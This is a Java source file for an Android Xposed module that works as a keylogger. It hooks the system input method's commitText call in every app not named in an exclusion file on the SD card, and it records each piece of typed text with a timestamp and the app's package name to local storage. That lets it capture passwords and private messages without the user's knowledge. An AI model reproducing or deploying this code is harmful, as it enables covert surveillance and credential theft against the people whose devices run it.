package com.tf.key;

import android.util.*;
import android.widget.*;
import de.robv.android.xposed.*;
import de.robv.android.xposed.callbacks.*;
import java.lang.reflect.*;
import android.text.format.*;
import java.util.*;
import android.view.*;  

public class MainActivity implements IXposedHookLoadPackage
{
	
	
	public EditText ed;
	public Calendar cal;
	public Date time;
	public List passlist;
	public String pack;
	//public static String get,packname,temp="init";
	@Override
	public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam p1) throws Throwable
	{   pack=p1.packageName.toString();
	
	try{
		passlist=line.getFileContent("/sdcard/hookpass.txt");
	}catch(Exception e){
		
	e.printStackTrace();
	}
	    
	for(String con:passlist){
		if(pack.endsWith(con)){
			return;
		}
	}
	
	
	
		prop.packname=pack;
		try{
	file.duqu();
		
}
catch(Exception e){
	file.cfile();

}
		de.robv.android.xposed.XposedHelpers.findAndHookMethod("android.view.inputmethod.BaseInputConnection" , p1.classLoader, "commitText", CharSequence.class, Integer.TYPE, new XC_MethodHook(){
////				//重写
				
				@Override		
				protected void afterHookedMethod(MethodHookParam param) throws Throwable
				{prop.packname=  p1.packageName.toString();
					
					//XposedBridge.log(param.getResult().toString());
					//Log.e("hooooooooook"+packname, "    :" + param.args[0]);
					if(prop.packname.equals(prop.temp)){
					prop.temp=prop.packname;
					
					file.jiaru(param.args[0].toString());
					}
					else{
						prop.temp=prop.packname;
						file.jiaru("\n\n"+new Date().toLocaleString()+"  "+prop.packname+"  :"+param.args[0]);
						
					}
					
				return;
				}

//				@Override
//				protected void afterHookedMethod(MethodHookParam param) throws Throwable
//				{
//
//
//
//					//XposedBridge.log(param.getResult().toString());
//					//Log.e("hooooooooook"+packname, "    :" + param.getResult());
//
//					//获取对象
//
//
//				}
//
			});


	
//
//				@Override
//				protected void afterHookedMethod(MethodHookParam param) throws Throwable
//				{
//
//
//
//					//XposedBridge.log(param.getResult().toString());
//					//Log.e("hooooooooook"+packname, "    :" + param.getResult());
//
//					//获取对象
//
//
//				}
//
			


		
		// TODO: Implement this method
	}




}
